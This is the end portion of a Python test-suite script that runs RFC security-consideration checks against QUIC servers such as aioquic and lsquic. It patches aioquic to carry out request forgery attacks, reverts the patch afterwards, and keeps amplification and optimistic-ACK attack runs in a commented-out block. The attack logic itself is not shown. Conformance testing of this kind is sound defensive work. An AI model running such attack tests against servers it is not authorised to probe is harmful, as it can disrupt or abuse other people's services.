    append_to_results(f"\n---------------------------------------- REQUEST FORGERY ATTACKS ----------------------------------------\n")
    
    logging.info("Patching aioquic code to perform Request Forgery Attacks...")
    try:
        os.chdir("./aioquic")
        subprocess.run(f"git apply ../requestForgery.patch", shell=True, check=True)
        os.chdir("..")
    except subprocess.CalledProcessError as e:
        logging.info(f"Patch for Request Forgery Attacks was already applied")
        os.chdir("..")

    for sp in server_ports:
        server, port = sp.split(':')
        port = int(port)
        security_consideration_request_forgery_attacks(server, port)
        #run_test_case_common_udp_ports_support(server, port)
        append_to_results(f"\n")

    logging.info("Reversing the patch for Request Forgery Attacks...")
    try:
        os.chdir("./aioquic")
        subprocess.run(f"git apply -R ../requestForgery.patch", shell=True, check=True)
        os.chdir("..")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to reverse the patch for Request Forgery Attacks: {e}")
        sys.exit(1)

    logging.info("Results Summary:")
    print(results_string)

"""
    append_to_results(f"\n---------------------------------------- AMPLIFICATION ATTACK ----------------------------------------\n")

    for sp in server_ports:
        server, port = sp.split(':')
        port = int(port)
        security_consideration_amplification_attack(server, port)
        append_to_results(f"\n")


    append_to_results(f"\n---------------------------------------- OPTIMISTIC ACK ATTACK ----------------------------------------\n")

    logging.info("Patching aioquic code to perform Optimistic ACK Attack...")
    try:
        os.chdir("./aioquic")
        subprocess.run(f"git apply ../optimisticACK.patch", shell=True, check=True)
        os.chdir("..")
    except subprocess.CalledProcessError as e:
        logging.info(f"Patch for Optimistic ACK Attack was already applied")
        os.chdir("..")

    for sp in server_ports:
        server, port = sp.split(':')
        port = int(port)
        security_consideration_optimistic_ACK_attack(server, port)
        append_to_results(f"\n")

    logging.info("Reversing the patch for Optimistic ACK attack...")
    try:
        os.chdir("./aioquic")
        subprocess.run(f"git apply -R ../optimisticACK.patch", shell=True, check=True)
        os.chdir("..")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to reverse the patch for Optimistic ACK Attack: {e}")
        sys.exit(1)
"""





   
        




if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Sample Usage: python3 testsuite.py aioquic:6001,lsquic:6002")
        sys.exit(1)
    
    # Record the start time
    start_time = time.time()

    server_ports = sys.argv[1].split(',')
    main(server_ports)

    # Record the end time
    end_time = time.time()

    # Calculate the runtime
    runtime = end_time - start_time
    logging.info(f"Test suite runtime: {runtime} seconds")
